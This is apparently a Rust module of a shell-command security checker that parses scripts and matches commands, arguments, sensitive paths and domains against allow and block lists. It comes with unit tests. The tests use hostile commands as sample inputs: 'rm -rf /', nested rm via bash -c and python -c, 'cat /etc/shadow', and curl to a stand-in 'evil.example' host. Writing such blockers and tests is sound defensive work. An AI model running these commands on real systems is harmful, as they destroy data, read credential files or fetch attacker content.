//! Policy evaluation over extracted commands + AST findings.
//!
//! Interpreters (`bash`, `sh`, …) are not blanket-blocked. Nested scripts
//! already re-parsed by the walker show up as their own commands.

use falk_config::SecurityConfig;

use crate::ast::{WalkFinding, walk_bash};
use crate::candidates::Candidate;

/// Evaluate a hybrid candidate. Returns a human-readable finding or `None`.
pub fn evaluate_policy(candidate: &Candidate, cfg: &SecurityConfig) -> Option<String> {
    evaluate_script(&candidate.script, cfg)
}

/// Evaluate a shell script: fail-closed walk, then allow/block/domain/path lists.
pub fn evaluate_script(script: &str, cfg: &SecurityConfig) -> Option<String> {
    let walk = walk_bash(script, cfg.max_ast_depth, cfg.max_ast_nodes);
    if let Some(finding) = walk.first_finding() {
        return Some(finding.reason());
    }
    for cmd in &walk.commands {
        if let Some(reason) = check_command(&cmd.name, &cmd.args, cfg) {
            return Some(reason);
        }
    }
    None
}

/// Classify a named tree-sitter kind using the same rule the walker applies.
pub fn finding_for_unknown_kind(kind: &str) -> WalkFinding {
    WalkFinding::UnknownNode {
        kind: kind.to_string(),
    }
}

fn check_command(name: &str, args: &[String], cfg: &SecurityConfig) -> Option<String> {
    let base = name.rsplit('/').next().unwrap_or(name);
    let base_lc = base.to_ascii_lowercase();

    if let Some((inner, rest)) = crate::ast::wrapped_command(&base_lc, args) {
        return check_command(&inner, &rest, cfg);
    }

    if crate::ast::is_interpreter_name(&base_lc) {
        // Interpreters themselves are not blanket-blocked.
    } else if !cfg.allowlist.commands.is_empty() {
        let allowed = cfg
            .allowlist
            .commands
            .iter()
            .any(|c| c.eq_ignore_ascii_case(base));
        if !allowed {
            return Some(format!("command `{base}` is not on the allowlist"));
        }
    }

    if cfg
        .blocklist
        .commands
        .iter()
        .any(|c| c.eq_ignore_ascii_case(base))
    {
        return Some(format!("command `{base}` is on the blocklist"));
    }

    for arg in args {
        if let Some(path) = sensitive_path_hit(arg, &cfg.blocklist.sensitive_paths) {
            return Some(format!("argument touches sensitive path `{path}`"));
        }
        if let Some(domain) = extract_domain(arg) {
            if let Some(reason) = check_domain(&domain, cfg) {
                return Some(reason);
            }
        }
    }
    None
}

fn sensitive_path_hit(arg: &str, paths: &[String]) -> Option<String> {
    for candidate in path_tokens(arg) {
        for p in paths {
            let expanded = expand_home(p);
            if candidate == p
                || candidate == expanded
                || candidate.starts_with(&format!("{expanded}/"))
                || candidate.starts_with(&format!("{p}/"))
            {
                return Some(p.clone());
            }
        }
    }
    None
}

/// Tokens that might name a path: the raw arg, the suffix after `=`,
/// and an attached short-flag path (`-o/etc/shadow`).
fn path_tokens(arg: &str) -> Vec<&str> {
    let mut out = vec![arg];
    if let Some((_, rest)) = arg.split_once('=') {
        if !rest.is_empty() {
            out.push(rest);
        }
    }
    if let Some(stripped) = arg.strip_prefix('-') {
        if !stripped.starts_with('-') && stripped.len() >= 2 {
            let after_flag = &stripped[1..];
            if after_flag.starts_with('/') || after_flag.starts_with('~') || after_flag.starts_with('.')
            {
                out.push(after_flag);
            }
        }
    }
    out
}

fn expand_home(p: &str) -> String {
    if let Some(rest) = p.strip_prefix("~/") {
        if let Ok(home) = std::env::var("HOME") {
            return format!("{home}/{rest}");
        }
    }
    p.to_string()
}

/// Pull a hostname out of a URL or `host:port` argument.
pub fn extract_domain(arg: &str) -> Option<String> {
    let arg = arg.trim();
    let rest = arg
        .strip_prefix("https://")
        .or_else(|| arg.strip_prefix("http://"))
        .or_else(|| arg.strip_prefix("wss://"))
        .or_else(|| arg.strip_prefix("ws://"))?;
    let host = rest.split(['/', '?', '#']).next().unwrap_or(rest);
    let host = host.rsplit('@').next().unwrap_or(host);
    let host = host.split(':').next().unwrap_or(host);
    if host.is_empty() {
        None
    } else {
        Some(host.to_ascii_lowercase())
    }
}

fn check_domain(domain: &str, cfg: &SecurityConfig) -> Option<String> {
    if cfg
        .network
        .blocked_domains
        .iter()
        .any(|d| domain_matches(domain, d))
    {
        return Some(format!("domain `{domain}` is blocked"));
    }
    if !cfg.network.allowed_domains.is_empty()
        && !cfg
            .network
            .allowed_domains
            .iter()
            .any(|d| domain_matches(domain, d))
    {
        return Some(format!("domain `{domain}` is not on the allowlist"));
    }
    None
}

fn domain_matches(host: &str, pattern: &str) -> bool {
    let p = pattern.trim().trim_start_matches('.').to_ascii_lowercase();
    host == p || host.ends_with(&format!(".{p}"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{Verdict, apply_enforcement};
    use falk_config::{EnforcementMode, SecurityConfig};

    #[test]
    fn unknown_kind_blocks_under_default_enforcement() {
        let finding = finding_for_unknown_kind("made_up_node");
        let verdict = apply_enforcement(EnforcementMode::Block, Some(finding.reason().as_str()));
        assert!(matches!(verdict, Verdict::Block { .. }));
        assert!(finding.reason().contains("fail-closed"));
    }

    #[test]
    fn allowlist_vs_blocklist() {
        let mut cfg = SecurityConfig::default();
        cfg.allowlist.commands = vec!["echo".into(), "ls".into()];
        assert!(evaluate_script("echo hi", &cfg).is_none());
        assert!(
            evaluate_script("rm -rf /", &cfg)
                .unwrap()
                .contains("allowlist")
        );

        let mut cfg = SecurityConfig::default();
        cfg.blocklist.commands = vec!["rm".into()];
        assert!(
            evaluate_script("rm -rf /tmp/x", &cfg)
                .unwrap()
                .contains("blocklist")
        );
        assert!(evaluate_script("echo hi", &cfg).is_none());
    }

    #[test]
    fn interpreter_not_blanket_blocked() {
        let mut cfg = SecurityConfig::default();
        cfg.blocklist.commands = vec!["rm".into()];
        // bash itself is not blocked; nested rm (re-parsed) is.
        let reason = evaluate_script(r#"bash -c "rm -rf /tmp/x""#, &cfg).unwrap();
        assert!(reason.contains("blocklist"), "{reason}");
    }

    #[test]
    fn sensitive_path_and_domain() {
        let mut cfg = SecurityConfig::default();
        cfg.blocklist.sensitive_paths = vec!["/etc/shadow".into()];
        cfg.network.blocked_domains = vec!["evil.example".into()];
        assert!(
            evaluate_script("cat /etc/shadow", &cfg)
                .unwrap()
                .contains("sensitive")
        );
        assert!(
            evaluate_script("curl https://evil.example/pwn", &cfg)
                .unwrap()
                .contains("blocked")
        );
    }

    #[test]
    fn extract_domain_from_url() {
        assert_eq!(
            extract_domain("https://api.github.com/repos"),
            Some("api.github.com".into())
        );
    }

    #[test]
    fn flag_output_form_hits_sensitive_path() {
        let mut cfg = SecurityConfig::default();
        cfg.blocklist.sensitive_paths = vec!["/etc/shadow".into()];
        let reason = evaluate_script("git show --output=/etc/shadow", &cfg)
            .expect("flag-form path must be a finding");
        assert!(reason.contains("sensitive"), "{reason}");
        assert!(
            evaluate_script("git show HEAD", &cfg).is_none(),
            "plain git show is not a path hit"
        );
    }

    #[test]
    fn env_and_python_c_honor_rm_blocklist() {
        let mut cfg = SecurityConfig::default();
        cfg.blocklist.commands = vec!["rm".into()];
        let env = evaluate_script("env rm -rf /tmp/x", &cfg).expect("env rm");
        assert!(env.contains("blocklist"), "{env}");
        let py = evaluate_script(r#"python -c "import os; os.system('rm -rf /tmp/x')""#, &cfg)
            .expect("python -c rm");
        assert!(py.contains("blocklist"), "{py}");
        assert!(
            evaluate_script("python3 --version", &cfg).is_none(),
            "interpreter name itself is not blocked"
        );
    }

    #[test]
    fn nodejs_is_allowlist_exempt_like_node() {
        let mut cfg = SecurityConfig::default();
        cfg.allowlist.commands = vec!["echo".into()];
        assert!(
            evaluate_script("nodejs --version", &cfg).is_none(),
            "nodejs must not be an allowlist reject"
        );
        assert!(
            evaluate_script("node --version", &cfg).is_none(),
            "node must stay exempt"
        );
        assert!(
            evaluate_script("rm -rf /tmp/x", &cfg)
                .unwrap()
                .contains("allowlist")
        );
    }
}
